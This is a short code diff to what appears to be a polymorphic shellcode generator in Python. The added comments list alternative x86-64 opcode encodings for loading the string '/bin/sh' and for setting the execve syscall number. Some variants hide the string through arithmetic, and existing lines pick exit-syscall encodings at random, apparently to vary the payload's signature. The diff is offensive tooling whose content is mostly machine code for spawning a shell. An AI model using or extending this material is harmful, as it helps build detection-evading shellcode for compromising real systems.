@@ -35,6 +35,25 @@ shellcode = ""
 #mov al, 30 - add al, 30 -> B01E041E
 #mov dl, 60 - mov rax, rdx -> B23C4889D0
 
+####### /bin/sh ######
+
+# mov rbx, 0x68732f6e69622f2f [Default] -> 48BB2F2F62696E2F7368
+
+# mov rbx, 0x68732f6e584d0a31
+# add rbx, 0x111524fe -> 48BB310A4D586E2F73684881C3FE241511 
+
+
+# mov rbx, 0x68733f5bd2cb3030 -> 48BB3030CBD25B3F73684881EB6969ED0F 
+# sub rbx, 0xfed6969
+
+
+###### SYSCALL EXECVE ######
+
+# mov al, 0x3b -> B03B
+
+# mov al, 0x3a
+# add al, 0x01 -> B03A0401
+
 list_exit = ["b03c", "b0632c27", "b01e041e", "b23c4889d0"]
 shellcode += random.choice(list_exit)
 print(shellcode)
